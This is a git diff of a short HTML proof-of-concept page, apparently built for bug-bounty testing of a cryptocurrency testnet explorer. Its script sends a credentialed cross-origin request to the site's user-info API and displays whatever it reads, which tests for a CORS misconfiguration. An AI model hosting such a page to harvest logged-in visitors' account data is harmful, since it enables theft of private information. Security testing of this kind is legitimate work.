@@ -1,37 +1,32 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>CORS PoC</title>
+  <title>CORS Test - Arc Testnet</title>
 </head>
 <body>
-  <h1>CORS PoC</h1>
+  <h2>Arc Testnet CORS Test</h2>
   <pre id="result">Testando...</pre>
 
   <script>
-    const endpoint =
-      "https://login.portswigger.net/forms/api/forms/ap_gFDHkUmP82ufvTtvQLPVFx/validations/$start";
+    const result = document.getElementById("result");
 
-    fetch(endpoint, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        formData: {},
-        metaData: {}
-      })
+    fetch("https://explorer.testnet.arc.io/api/account/v2/user/info", {
+      method: "GET",
+      credentials: "include"
     })
     .then(async response => {
-      const body = await response.text();
+      const text = await response.text();
 
-      document.getElementById("result").textContent =
+      result.textContent =
         "HTTP: " + response.status +
-        "\n\nResposta:\n" + body;
+        "\n\nCORS READ SUCCESS\n\n" +
+        text;
     })
     .catch(error => {
-      document.getElementById("result").textContent =
-        "FETCH/CORS ERROR:\n\n" + error;
+      result.textContent =
+        "CORS READ FAILED\n\n" +
+        error;
     });
   </script>
 </body>
